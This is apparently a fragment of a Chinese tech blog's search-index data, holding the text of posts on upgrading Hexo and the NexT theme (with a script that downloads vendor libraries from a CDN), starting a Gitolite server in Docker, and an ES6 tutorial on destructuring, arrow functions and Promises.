plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c语言"},{title:"Hexo 与 Next 版本升级教程",url:"/posts/d1f06120.html",text:'前言 Next 官方博客 Next 官方教程 - 版本升级 Next 各版本的仓库 年份 版本 仓库 2014 ~ 2017 v5 https://github.com/iissnan/hexo-theme-next 2018 ~ 2019 v6 ~ v7 https://github.com/theme-next/hexo-theme-next 2020 v8 https://github.com/next-theme/hexo-theme-next Next 与 Hexo 版本适配关系 NodeJS 版本升级NodeJS 版本升级不是必须的，可以根据自己的实际情况选择是否升级，首先在 NodeJS 官网下载最新版的二进制安装包，解压后配置系统环境变量即可。 123456789# 配置环境变量# vim /etc/profileexport PATH=$PATH:/usr/local/node-v14.16.1/binNODE_PATH=/usr/local/node-v14.16.1/lib/node_modulesPATH=$PATH:$NODE_PATHexport NODE_PATH PATH# 使配置生效# source /etc/profile Hexo 版本升级笔者是从 Hexo 3.9.0 升级到 Hexo 5.4.0，步骤如下： 全局升级 Hexo 版本若曾经在系统里，直接使用过 hexo 的命令，才需要执行以下升级操作 123456789101112131415# 清理NPM缓存$ npm cache clean -f# 全局安装版本检测、版本升级工具$ npm install -g npm-check$ npm install -g npm-upgrade# 全局检测哪些模块可以升级，这里可以根据打印的提示信息，手动安装最新版本的模块$ npm-check -g# 全局更新模块$ npm update -g# 全局安装或更新Hexo的最新版本$ npm install --global hexo 博客升级 Hexo 版本1234567891011121314151617181920212223# 进入博客的根目录$ cd /blog-root# 检测Hexo哪些模块可以升级$ npm-check# 删除package-lock.json# rm -rf package-lock.json# 更新package.json$ npm-upgrade# 删除整个模块目录，这样可以避免很多坑$ rm -rf node_modules# 更新Hexo的模块$ npm update --save# 若出现依赖的问题，用以下命令检查一下，然后把报错的统一修复一下即可$ npm audix# 或者强制更新$ npm update --save --force 由于新版的 Hexo 一般增加了不少新特性，因此需要使用新版 Hexo 默认的配置模版文件 _config.yml，同时还需要稍微更改旧版的 package.json 配置文件，否则容易出现各种兼容错误 123456# 进入博客的根目录$ cd /blog-root# 备份旧版的配置文件$ mv _config.yml _config.yml.bak$ mv package.json package.json.bak 12345678$ 单独初始化全新的Hexo博客目录$ hexo init hexo-upgrade$ 拷贝新的配置模版文件到博客的根目录$ cp hexo-upgrade/_config.yml /blog-root/_config.yml$ cp hexo-upgrade/package.json /blog-root/package.json# 最后在新的配置模版文件里，重新追加旧版的Hexo配置内容 升级 Next 主题注意事项笔者 从 Next 7.8.0 升级到 Next 8.3.0，值得一提的是，Next 版本升级必须注意以下事项： Next 与 Hexo 的版本必须兼容 必须使用新版 Next 主题的 _config.yml 配置文件，若继续使用 Next 旧版的 _config.yml 配置文件，容易出现各种兼容错误 版本升级12345678910# 进入博客的主题目录$ cd /boot-root/theme# 备份旧版主题的配置$ mv next next-bak# 拉取最新的代码（注意：Next不同版本使用不同的仓库）$ git clone https://github.com/next-theme/hexo-theme-next next# 最后将旧版的Next配置内容追加到Next新版的配置文件中，包括拷贝旧版自定义的样式、布局文件等 本地下载第三方库（可选）在 Next 8.3.0 的 _config.yml 中，新增了 vendors.internal 属性（如下配置）来指定加载本地的第三方库文件，默认存放路径为 themes/next/source/lib；启用后站点就不再需要依赖第三方的 CDN 资源，而是直接使用本地站点的资源文件，这样可以让站点的访问速度更稳定。 1234567891011# It\'s recommended to use the same version as in `_vendors.yml` to avoid potential problems.# Remember to use the HTTPS protocol of CDN links when you enable HTTPS on your site.vendors: # The CDN provider of NexT internal scripts. # Available values: local | jsdelivr | unpkg | cdnjs # Warning: If you are using the latest master branch of NexT, please set `internal: local` internal: local # The default CDN provider of third-party plugins. # Available values: local | jsdelivr | unpkg | cdnjs # Dependencies for `plugins: local`: https://github.com/next-theme/plugins plugins: local 安装 NexT 插件特别注意 若希望使用本地的第三方库文件，则需要安装 NexT 的 @next-theme/plugins 插件，其中插件的版本必须与 NexT 主题的版本一致。 12# 安装插件$ npm install @next-theme/plugins --save 批量下载第三方库将 themes/next/_vendors.yml 里定义的第三方库文件统一下载下来，并存放在 themes/next/source/lib 目录下，具体步骤如下 临时更改 themes/next/scripts/events/lib/vendors.js 源文件的代码（如下所示），然后执行 hexo g 命令，从输出日志信息中得到批量下载第三方库文件的 curl 命令 将得到的所有 curl 命令保存到 Shell 脚本文件里，然后执行 Shell 脚本文件批量下载第三方库文件到 themes/next/source/lib 目录下 最后还原 themes/next/scripts/events/lib/vendors.js 源文件的代码 1234567891011// 打印下载命令const { name, version, file, alias, unavailable } = value;if (version) { var _path = `https://cdn.jsdelivr.net/npm/${name}@${version}/${file}`; console.log("curl " + _path + " --create-dirs -o ${DIR}" + "/" + name + "/" + file); continue;}const links = { // 省略 ...}; 批量下载 Next 8.3.0 版本所需的第三方库文件的 Shell 脚本文件如下，DIR 是 themes/next/source/lib 目录的绝对路径，请自行更改 123456789101112131415161718192021222324252627282930313233343536#!/bin/shDIR=/usr/local/hexo-develop/themes/next/source/librm -rf ${DIR}/*curl https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js --create-dirs -o ${DIR}/animejs/lib/anime.min.jscurl https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css --create-dirs -o ${DIR}/@fortawesome/fontawesome-free/css/all.min.csscurl https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js --create-dirs -o ${DIR}/prismjs/components/prism-core.min.jscurl https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js --create-dirs -o ${DIR}/prismjs/plugins/autoloader/prism-autoloader.min.jscurl https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/line-numbers/prism-line-numbers.min.js --create-dirs -o ${DIR}/prismjs/plugins/line-numbers/prism-line-numbers.min.jscurl https://cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js --create-dirs -o ${DIR}/mathjax/es5/tex-mml-chtml.jscurl https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.css --create-dirs -o ${DIR}/katex/dist/katex.min.csscurl https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/copy-tex.min.js --create-dirs -o ${DIR}/katex/dist/contrib/copy-tex.min.jscurl https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/copy-tex.min.css --create-dirs -o ${DIR}/katex/dist/contrib/copy-tex.min.csscurl https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js --create-dirs -o ${DIR}/@next-theme/pjax/pjax.min.jscurl https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js --create-dirs -o ${DIR}/jquery/dist/jquery.min.jscurl https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js --create-dirs -o ${DIR}/@fancyapps/fancybox/dist/jquery.fancybox.min.jscurl https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css --create-dirs -o ${DIR}/@fancyapps/fancybox/dist/jquery.fancybox.min.csscurl https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js --create-dirs -o ${DIR}/medium-zoom/dist/medium-zoom.min.jscurl https://cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js --create-dirs -o ${DIR}/lozad/dist/lozad.min.jscurl https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js --create-dirs -o ${DIR}/pangu/dist/browser/pangu.min.jscurl https://cdn.jsdelivr.net/npm/quicklink@2.1.0/dist/quicklink.umd.js --create-dirs -o ${DIR}/quicklink/dist/quicklink.umd.jscurl https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqus.js --create-dirs -o ${DIR}/disqusjs/dist/disqus.jscurl https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css --create-dirs -o ${DIR}/disqusjs/dist/disqusjs.csscurl https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js --create-dirs -o ${DIR}/gitalk/dist/gitalk.min.jscurl https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css --create-dirs -o ${DIR}/gitalk/dist/gitalk.csscurl https://cdn.jsdelivr.net/npm/firebase@8.3.1/firebase-app.js --create-dirs -o ${DIR}/firebase/firebase-app.jscurl https://cdn.jsdelivr.net/npm/firebase@8.3.1/firebase-firestore.js --create-dirs -o ${DIR}/firebase/firebase-firestore.jscurl https://cdn.jsdelivr.net/npm/algoliasearch@4.8.6/dist/algoliasearch-lite.umd.js --create-dirs -o ${DIR}/algoliasearch/dist/algoliasearch-lite.umd.jscurl https://cdn.jsdelivr.net/npm/instantsearch.js@4.19.0/dist/instantsearch.production.min.js --create-dirs -o ${DIR}/instantsearch.js/dist/instantsearch.production.min.jscurl https://cdn.jsdelivr.net/npm/pdfobject@2.2.5/pdfobject.min.js --create-dirs -o ${DIR}/pdfobject/pdfobject.min.jscurl https://cdn.jsdelivr.net/npm/mermaid@8.9.2/dist/mermaid.min.js --create-dirs -o ${DIR}/mermaid/dist/mermaid.min.jscurl https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css --create-dirs -o ${DIR}/animate.css/animate.min.csscurl https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js --create-dirs -o ${DIR}/nprogress/nprogress.jscurl https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.css --create-dirs -o ${DIR}/nprogress/nprogress.csscurl https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js --create-dirs -o ${DIR}/ribbon.js/dist/ribbon.min.js 常见问题问题一完成上述升级操作后，执行 hexo generator 命令后，themes/next/scripts/events/lib/vendors.js 的代码里面抛出以下错误信息： 1234567891011121314151617181920INFO Start processingFATAL { err: TypeError: Cannot read property \'call\' of undefined at module.exports (/usr/local/hexo-develop/themes/next/scripts/events/lib/vendors.js:27:25) at Hexo.&lt;anonymous&gt; (/usr/local/hexo-develop/themes/next/scripts/events/index.js:9:27) at Hexo.tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Hexo.&lt;anonymous&gt; (/usr/local/hexo-develop/node_modules/bluebird/js/release/method.js:15:34) at /usr/local/hexo-develop/node_modules/hexo/lib/extend/filter.js:67:52 at tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Object.gotValue (/usr/local/hexo-develop/node_modules/bluebird/js/release/reduce.js:166:18) at Object.gotAccum (/usr/local/hexo-develop/node_modules/bluebird/js/release/reduce.js:155:25) at Object.tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Promise._settlePromiseFromHandler (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:547:31) at Promise._settlePromise (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:604:18) at Promise._settlePromiseCtx (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:641:10) at _drainQueueStep (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:97:12) at _drainQueue (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:86:9) at Async._drainQueues (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:102:5) at Immediate.Async.drainQueues [as _onImmediate] (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:15:14) at processImmediate (internal/timers.js:461:21) 这一般是 Hexo 的部分模块没有成功更新引起，例如 hexo-util 模块更新失败，最终导致代码不兼容。首先检查 hexo-util 模块的版本，然后可以尝试执行以下命令，强制更新 hexo-util 模块 12345# 进入博客的主题目录$ cd /boot-root/# 强制更新$ npm update --save --force 问题二完成上述升级操作后，执行 hexo generator 命令后，Hexo 会抛出以下错误信息： 123456789101112131415161718192021222324FATAL { err: TypeError: line.matchAll is not a function at res.value.res.value.split.map.line (/usr/local/hexo-develop/node_modules/hexo-util/lib/highlight.js:128:26) at Array.map (&lt;anonymous&gt;) at closeTags (/usr/local/hexo-develop/node_modules/hexo-util/lib/highlight.js:126:37) at highlight (/usr/local/hexo-develop/node_modules/hexo-util/lib/highlight.js:119:10) at highlightUtil (/usr/local/hexo-develop/node_modules/hexo-util/lib/highlight.js:23:16) at data.content.dataContent.replace (/usr/local/hexo-develop/node_modules/hexo/lib/plugins/filter/before_post_render/backtick_code_block.js:92:17) at String.replace (&lt;anonymous&gt;) at Hexo.backtickCodeBlock (/usr/local/hexo-develop/node_modules/hexo/lib/plugins/filter/before_post_render/backtick_code_block.js:19:30) at Hexo.tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Hexo.&lt;anonymous&gt; (/usr/local/hexo-develop/node_modules/bluebird/js/release/method.js:15:34) at Promise.each.filter (/usr/local/hexo-develop/node_modules/hexo/lib/extend/filter.js:67:52) at tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Object.gotValue (/usr/local/hexo-develop/node_modules/bluebird/js/release/reduce.js:166:18) at Object.gotAccum (/usr/local/hexo-develop/node_modules/bluebird/js/release/reduce.js:155:25) at Object.tryCatcher (/usr/local/hexo-develop/node_modules/bluebird/js/release/util.js:16:23) at Promise._settlePromiseFromHandler (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:547:31) at Promise._settlePromise (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:604:18) at Promise._settlePromise0 (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:649:10) at Promise._settlePromises (/usr/local/hexo-develop/node_modules/bluebird/js/release/promise.js:729:18) at _drainQueueStep (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:93:12) at _drainQueue (/usr/local/hexo-develop/node_modules/bluebird/js/release/async.js:86:9) NodeJS 从 12.0.0 才开始支持函数 String.matchAll()，如果 NodeJS 的版本低于 12.0.0，那么执行 Hexo 的构建命令就会出现上述的错误，解决方法如下： 方法一：将 NodeJs 升级到高于 12.0.0 的版本 方法二：更改 Hexo 的配置文件 _config.yml，禁用 highlight 的功能，这样就可以避免出错，但这将会关闭代码的高亮显示功能 12highlight: enable: false var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"Docker 基于 Gitolite 搭建 Git 服务器",url:"/posts/4da97727.html",text:'前言官方教程 Docker Install Gitolite Centos7 使用 Gitolite 搭建 Git 服务器 镜像数据卷目录 目录 用途 /home/git/repositories 存储实际的 Git 仓库 /etc/ssh 存储 SSH 主机密钥 Docker 安装 Gitolite这里直接使用国外开发者构建好的 Docker 镜像 elsdoerfer/gitolite，不再通过手写 Dockerfile 来构建 Gitolite，具体使用方法如下： 12# 拉取镜像# docker pull elsdoerfer/gitolite:latest var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化 版本控制"},{title:"ES6 快速入门教程",url:"/posts/259675f9.html",text:'ECMAScriptECMAScript 简介ECMAScript 是一种由 Ecma 国际（前身为欧洲计算机制造商协会，英文名称是 European Computer Manufacturers Association）通过 ECMA-262 标准化的脚本程序设计语言。ECMAScript 是浏览器脚本语言的规范，而 JavaScript 和 JScript 都是 ECMAScript 规范的实现者。 前端发展历程回顾 Web 1.0 时代 最初的网页以 HTML 为主，是纯静态的网页。网页是只读的，信息流只能从服务到客户端单向流通。开发人员只关心页面的样式和内容即可。 Web 2.0 时代 1995 年，网景工程师 Brendan Eich 花了 10 天时间设计了 JavaScript 语言。 1996 年，微软发布了 JScript，其实是 JavaScript 的逆向工程实现。 1996 年 11 月，JavaScript 的创造者 Netscape 公司，决定将 JavaScript 提交给标准化组织 ECMA，希望这种语言能够成为国际标准。 1997 年，ECMA 发布 262 号标准文件（ECMA-262）的第一版，规定了浏览器脚本语言的标准，并将这种语言称为 ECMAScript，这个版本就是 1.0 版。 JavaScript 和 JScript 都是 ECMAScript 规范的实现者，随后各大浏览器厂商纷纷实现了 ECMAScript 规范。 ES6 快速入门ES6 简介ECMAScript 6.0（简称 ES6）是 JavaScript 语言的下一代标准，在 2015 年 6 月正式发布，并且从 ECMAScript 6 开始，开始采用年号来做版本。因此，ECMAScript 2015，也被称为 ECMAScript 6。它的目标，是使得 JavaScript 语言可以用来编写复杂的大型应用程序，成为企业级开发语言。 ECMAScript 每年发布一个新版本，从版本发布的概念上，不同版本的 ECMAScript 可以类比不同版本的 Java JDK（例如 JDK 8、JDK 11、JDK 15）。 变量声明let 声明变量 let 声明的变量有严格的局部作用域，而 var 声明的变量往往会越域 123456{ var a = 1; let b = 2;}console.log(a); // 1console.log(b); // ReferenceError: b is not defined 同一个变量，let 只可以声明一次，而 var 可以声明多次 123456var a = 1;var a = 2;let b = 3;// let b = 4; // 同一个变量声明多次会出现语法错误console.log(a); // 2console.log(b); // 3 let 不存在变量提升，而 var 存在变量提升 12345console.log(a); // undefinedvar a = 1;console.log(y); // ReferenceError: Cannot access \'y\' before initializationlet y = 2; const 声明常量 const 用于声明常量，声明后不允许改变常量的值，一旦声明必须初始化，否则会出现语法错误 12const a = 1;a = 2; // Uncaught TypeError: Assignment to constant variable. 解构表达式数组解构1234567891011let arr = [1, 2, 3];// 第一种写法（普通），通过角标获取数组元素let a1 = arr[0];let a2 = arr[1];let a3 = arr[2];console.log(a1, a2, a3); // 1 2 3// 第二种写法（数组解构），b1, b2, b3 将与 arr 数组中的每个位置对应来取值let [b1, b2, b3] = arr;console.log(b1, b2, b3); // 1 2 3 对象解构1234567891011121314151617const person = { name: "jack", age: 23}// 第一种写法（普通），通过对象来获取属性值const name1 = person.name;const age1 = person.age;console.log(name1, age1);// 第二种写法（对象解构），对象里面的每个属性和左边对应赋值const {name, age} = person;console.log(name, age);// 第三种写法（对象解构），对象里面的每个属性和左边对应赋值，并使用变量别名const {name:name2, age:age2} = person;console.log(name2, age2); 字符串扩展新 API 函数 includes()：返回布尔值，表示是否找到了参数字符串 startsWith()：返回布尔值，表示参数字符串是否在原字符串的头部 endsWith()：返回布尔值，表示参数字符串是否在原字符串的尾部 12345let str = "hello world"; console.log(str.startsWith("hello")); // trueconsole.log(str.endsWith("world")); // trueconsole.log(str.includes("e")); // trueconsole.log(str.includes("hello")); // true 字符串模版模板字符串相当于加强版的字符串，使用反引号 ` 包裹，除了可以作为普通字符串，还可以用来定义多行字符串，也可以在字符串中加入变量和表达式。 定义多行字符串 123456let str = ` &lt;div&gt; &lt;span&gt;Hello World&lt;/span&gt; &lt;/div&gt; `;console.log(str); 字符串中插入变量，变量名写在 ${} 内 1234let name = "Jack";let age = 18;let info = `我是${name}, 年龄是${age}岁`;console.log(info); 字符串中插入表达式，${} 内可以放入 JavaScript 表达式，例如函数调用 1234567function fun() { return "This is a function."}// 在字符串中调用函数let str2 = `Return Message : ${fun()}`;console.log(str2); 函数优化函数参数默认值ES6 支持给函数参数设置默认值，语法为 参数名称 = 默认值 123456789101112131415// 在 ES6 之前，无法给一个函数参数设置默认值，只能采用变通的写法function add(a, b) { // 判断 b 是否为空，为空则赋默认值 1 b = b || 1; return a + b;}// 只传递一个参数console.log(add(10)); // 11// ES6 可以这么写，直接给参数设置默认值，如果没有传递就会自动使用默认值function sub(a, b = 1) { return a - b;}// 只传递一个参数console.log(sub(3)); // 2 不定参数不定参数用来表示不确定参数个数，语法为 ... 变量名，由 ... 加上一个具名参数标识符组成。特别注意，具名参数只能放在参数列表的最后，并且有且只能有一个不定参数。 12345function fun(... params) { console.log(params.length);}fun("a", "b"); // 2fun("a", "b", "c", "d"); // 4 箭头函数声明单个参数的函数123456789101112131415161718192021// 在 ES6 之前，声明单个参数函数的写法var print = function (param) { console.log(param);};print("Hello World");// 在 ES6 中，声明单个参数函数的写法（第一种）var echo = (param) =&gt; { console.log(param);}echo("Hello World")// 在 ES6 中，声明单个参数函数的写法（第二种），只有一个参数时，可省略括号 ()var output = param =&gt; { console.log(param);}output("Hello World")// 在 ES6 中，声明单个参数函数的写法（第三种），函数体只有一行语句时，可以省略 {}var display = param =&gt; console.log(param);display("Hello World") 声明多个参数的函数12345678910111213141516171819// 在 ES6 之前，声明多个参数函数的写法var sum = function (a, b) { console.log(a + b);}sum(2, 5);// 在 ES6 中，声明多个参数函数的写法（第一种）var sub = (a, b) =&gt; { console.log(a - b);}sub(5, 2);// 在 ES6 中，声明多个参数函数的写法（第二种），函数体只有一行语句时，可以省略 {}var div = (a, b) =&gt; console.log(a / b);div(8, 4);// 在 ES6 中，声明多个参数函数的写法（第三种），函数体只有一行语句时，并且需要返回结果时，可以省略 {}，会自动返回结果var multi = (a, b) =&gt; a * b;console.log(multi(3, 7)); 箭头函数结合解构表达式12345678910111213141516const person = { name: "jack", age: 23}// 在 ES6 之前，声明一个对象，将对象作为函数参数，然后在函数体内访问对象属性的写法function printPerson(person){ console.log("hello " + person.name);}printPerson(person);// 在 ES6 中，声明一个对象，将对象作为函数参数，然后在函数体内访问对象属性的写法var echoPerson = ({ name }) =&gt; { console.log("hello " + name);}echoPerson(person); 对象优化新 API 函数ES6 给 Object 对象拓展了许多新的 API 函数，如： keys(obj)：获取对象的所有 key 形成的数组 values(obj)：获取对象的所有 value 形成的数组 entries(obj)：获取对象的所有 key 和 value 形成的二维数组，格式：[[k1,v1], [k2,v2], ...] assign(dest, ...src)：将多个 src 对象的值拷贝到 dest 中（第一层为深拷贝，第二层为浅拷贝）。 1234567const person = { name: "jack", age: 25}console.log(Object.keys(person)); // [\'name\', \'age\']console.log(Object.values(person)); // [\'jack\', 25]console.log(Object.entries(person)); // [Array(2), Array(2)] 1234567const dest = {a : 1};const source1 = {b: 2};const source2 = {c: 3};// Object.assign() 拷贝函数的第一个参数是目标对象，后面的参数都是源对象Object.assign(dest, source1, source2);console.log(dest); // {a:1, b:2, c:3} 声明对象简写12345678910const age = 23;const name = "Jack";// 在 ES6 之前，声明对象的写法const person1 = {age: age, name: name};console.log(person1); // {age: 23, name: "Jack"}// 在 ES6 中，声明对象时支持简写const person2 = {age, name};console.log(person2); // {age: 23, name: "Jack"} 对象的函数属性简写12345678910111213141516171819202122let person = { name: "Jack", // 在 ES6 之前，对象的函数属性的写法 eat: function (food) { console.log(this.name + " eat " + food); }, // 在 ES6 中，对象的函数属性的第一种写法（箭头函数版本），这里拿不到 this 对象 play1: (toy) =&gt; { console.log(person.name + " play " + toy); }, // 在 ES6 中，对象的函数属性的第二种写法（简写版本），这里可以拿到 this 对象 play2 (toy) { console.log(this.name + " play " + toy); }}person.eat(\'apple\'); // Jack eat appleperson.play1("computer"); // Jack play computerperson.play2("computer"); // Jack play computer 对象拓展运算符对象拓展运算符 ... 用于取出参数对象所有可遍历的属性，然后拷贝给当前对象。 12345678910// 拷贝对象（深拷贝）let person1 = { name: "Jack", age: 23 };let someone = { ...person1 };console.log(someone); // {name: "Jack", age: 23}// 合并对象，如果两个对象的属性有重复，后面对象的属性值会覆盖前面对象的属性值let person2 = { age: 15 };let person3 = { name: "Jack" };let person4 = { ...person2, ...person3 };console.log(person4); // {age: 15, name:"Jack"} map 和 reduce 函数ES6 在数组中新增了 map 和 reduce 函数。 map 函数 语法：arr.map(callback) 描述：map 函数的参数是一个回调函数，将原数组中的所有元素用这个回调函数处理后放入新数组并返回。 12345678let arr = ["1", "23", "5", "16"];console.log(arr); // ["1", "23", "5", "16"]arr = arr.map(item =&gt; parseInt(item));console.log(arr); // [1, 23, 5, 16]arr = arr.map(item =&gt; item * 2);console.log(arr); // [2, 46, 10, 32] reduce 函数 语法：arr.reduce(callback, [initialValue]) 描述：reduce 函数会为数组中的每一个元素依次执行回调函数，不包括数组中被删除或从未被赋值的元素 callback：处理数组中每个元素的回调函数，包含四个参数 previousValue：上一次调用回调函数返回的值，或者是提供的初始值（initialValue） currentValue：数组中当前被处理的元素 index：当前元素在数组中的索引 array：调用 reduce 函数的数组 initialValue：作为第一次调用 callback 回调函数的初始值（或者上一次回调函数的返回值） 123456789const arr = [1, 20, -5, 3];// 没有初始值console.log(arr.reduce((a, b) =&gt; a + b)); // 19 = 1 + 20 + (-5) + 3console.log(arr.reduce((a, b) =&gt; a * b)); // -300 = 1 * 20 * (-5) * 3// 拥有初始值console.log(arr.reduce((a, b) =&gt; a + b, 1)); // 20 = 1 + 1 + 20 + (-5) + 3console.log(arr.reduce((a, b) =&gt; a * b, 0)); // -0 = 0 * 1 * 20 * (-5) * 3 Promise在 JavaScript 的世界中，所有代码都是单线程执行的。由于这个 “缺陷”，导致 JavaScript 的所有网络操作，浏览器事件，都必须是异步执行。异步执行可以用回调函数实现。一旦有一连串的 Ajax 请求 a，b，c，d … 后面的请求依赖前面的请求结果，就需要层层嵌套。这种缩进和层层嵌套的方式，非常容易造成上下文代码混乱，开发者不得不非常小心翼翼处理内层函数与外层函数的数据，一旦内层函数使用了上层函数的变量，这种混乱程度就会加剧。总之，这种层叠上下文的层层嵌套方式，着实增加了开发的难度。 传统 Ajax 回调使用案例这里将演示传统 Ajax 回调的使用案例，目的是让读者对层层嵌套的代码有一个直观的了解。 需求说明用户登录后，展示该用户的各科成绩。在页面发送三次请求: 1、查询用户，查询成功说明可以登录 2、根据用户的查询结果，查询科目信息 3、根据科目的查询结果，获取科目成绩 后端接口此时后台应该提供三个接口，一个提供用户的查询接口，一个提供科目的查询接口，一个提供各科成绩的查询接口。为了渲染方便，建议最好是响应 JSON 数据。在这里就不编写后台接口了，而是提供三个 JSON 文件，通过直接提供 JSON 数据的方式来模拟后台的接口。 user.json 12345{ "id": 1, "name": "zhangsan", "password": "123456"} user_corse_1.json 1234{ "id": 10, "name": "chinese"} corse_score_10.json 1234{ "id": 100, "score": 90} 调用接口在传统的 Jquery Ajax 回调方式中，回调函数层层嵌套，也被称为 回调地狱。 123456789101112131415161718192021222324252627$.ajax({ url: "mock/user.json", success(data) { console.log("查询到用户:", data); $.ajax({ url: `mock/user_corse_${data.id}.json`, success(data) { console.log("查询到课程:", data); $.ajax({ url: `mock/corse_score_${data.id}.json`, success(data) { console.log("查询到分数:", data); }, error(error) { console.log("出现异常了:" + error); } }); }, error(error) { console.log("出现异常了:" + error); } }); }, error(error) { console.log("出现异常了:" + error); }}); Promise 语法 基础版的语法 12345678910const promise = new Promise(function (resolve, reject) { // 执行异步操作 let result = true; // 判断异步操作执行的结果 if (result) { resolve(value); // 调用 resolve 函数，代表 Promise 将返回成功的结果 } else { reject(error); // 调用 reject 函数，代表 Promise 将会返回失败结果 }}); 箭头函数版的语法 12345678910const promise = new Promise((resolve, reject) =&gt; { // 执行异步操作 let result = true; // 判断异步操作执行的结果 if (result) { resolve(value); // 调用 resolve 函数，代表 Promise 将返回成功的结果 } else { reject(error); // 调用 reject 函数，代表 Promise 将会返回失败结果 }}); Prmise 处理执行结果如果想要等待异步执行完成后做一些事情，可以通过 Promise 的 then 函数来实现。如果想要处理 Promise 异步执行失败的事件，还可以使用 catch 函数。 12345promise.then(function (value) { // 异步执行成功后的回调}).catch(function (error) { // 异步执行失败后的回调}) Promise 使用案例上述的 Jquery Ajax 回调代码，使用 Promise 改造后如下： 12345678910111213141516171819202122232425262728293031323334new Promise((resolve, reject) =&gt; { $.ajax({ url: "mock/user.json", success(data) { console.log("查询到用户:", data); resolve(data.id); }, error(error) { console.log("出现异常了:" + error); } });}).then((userId) =&gt; { return new Promise((resolve, reject) =&gt; { $.ajax({ url: `mock/user_corse_${userId}.json`, success(data) { console.log("查询到课程:", data); resolve(data.id); }, error(error) { console.log("出现异常了:" + error); } }); });}).then((corseId) =&gt; { $.ajax({ url: `mock/corse_score_${corseId}.json`, success(data) { console.log("查询到分数:", data); }, error(error) { console.log("出现异常了:" + error); } });}); Promise 优化处理通常在企业开发中，会把 Promise 封装成通用方法，下述的代码封装了一个通用的 get 请求方法： 1234567891011121314151617181920212223242526272829// 企业开发中，往往会将 get 方法单独放到 common.js 中let get = function (url, data) { return new Promise((resolve, reject) =&gt; { $.ajax({ url: url, type: "GET", data: data, success(result) { resolve(result); }, error(error) { reject(error); } }); })}// 使用封装的 get 方法，实现分数查询get("mock/user.json").then((result) =&gt; { console.log("查询到用户:", result); return get(`mock/user_corse_${result.id}.json`);}).then((result) =&gt; { console.log("查询到课程:", result); return get(`mock/corse_score_${result.id}.json`)}).then((result) =&gt; { console.log("查询到分数:", result);}).catch(() =&gt; { console.log("出现异常了:" + 